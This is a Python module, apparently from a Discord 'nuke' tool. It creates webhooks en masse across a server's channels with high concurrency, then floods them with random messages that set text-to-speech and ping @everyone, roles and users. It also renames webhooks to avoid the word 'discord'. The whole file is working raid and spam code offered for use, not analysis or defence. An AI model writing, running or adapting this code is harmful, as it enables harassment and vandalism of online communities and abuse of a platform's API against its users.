from __future__ import annotations

import logging
from asyncio import Semaphore, gather, sleep
from typing import Any

from nuke.config import rand_msg, rand_webhook_name
from nuke.profile import _avatar_cache

create_sem = Semaphore(1000)
spam_sem = Semaphore(1000)


async def create(
    limiter: Any,
    guild_id: int,
    channel_id: str,
    session: Any | None,
    headers: dict[str, str] | None = None,
) -> Any:
    from models.nuke import nukewebhook

    async with create_sem:
        name = rand_webhook_name()
        name = _clean_name(name)
        payload: dict = {"name": name}
        av = _avatar_cache.get_any()
        if av:
            payload["avatar"] = av
        h = headers if headers is not None else {}
        for attempt in range(3):
            try:
                res = await limiter.request(
                    "POST",
                    f"guilds:{guild_id}:wh:create:{channel_id}",
                    f"https://discord.com/api/v10/channels/{channel_id}/webhooks",
                    json=payload,
                    headers=h,
                )
                if res.status in (200, 201):
                    data = await res.json()
                    return nukewebhook(
                        id=data["id"], token=data["token"], channel_id=channel_id
                    )
                body = await res.text()
                if res.status >= 500 and attempt < 2:
                    await sleep(0.5 * (attempt + 1))
                    continue
                logging.warning(f"wh create failed {res.status}: {body[:200]}")
            except Exception as e:
                logging.warning(f"wh create ch {channel_id}: {e}")
            break
        return None


async def spam(
    limiter: Any,
    wh: Any,
    headers: dict[str, str] | None = None,
    session: Any = None,
) -> None:
    async with spam_sem:
        name = rand_webhook_name()
        name = _clean_name(name)
        av = _avatar_cache.get_any()
        payload: dict = {
            "content": rand_msg(),
            "allowed_mentions": {"parse": ["roles", "users", "everyone"]},
            "tts": True,
        }
        if name:
            payload["name"] = name
        if av:
            payload["avatar"] = av
        try:
            await limiter.request(
                "POST",
                f"webhooks:{wh.token}",
                f"https://discord.com/api/v10/webhooks/{wh.id}/{wh.token}",
                json=payload,
                headers=headers,
            )
        except Exception as e:
            logging.warning(f"wh spam {wh.id}: {e}")


async def create_many(
    limiter: Any,
    guild_id: int,
    channel_ids: list[str],
    session: Any,
    headers: dict[str, str] | None = None,
) -> list[Any]:
    from models.nuke import nukewebhook

    headers = headers if headers is not None else {}

    results: list[nukewebhook | None] = []
    for i in range(0, len(channel_ids), 25):
        batch = await gather(
            *[
                create(limiter, guild_id, cid, session, headers)
                for cid in channel_ids[i : i + 25]
            ],
            return_exceptions=True,
        )
        for w in batch:
            if isinstance(w, nukewebhook):
                results.append(w)
            elif not isinstance(w, Exception):
                pass

    return results


def _clean_name(name: str) -> str:
    return name if "discord" not in name.lower() else "nuke"
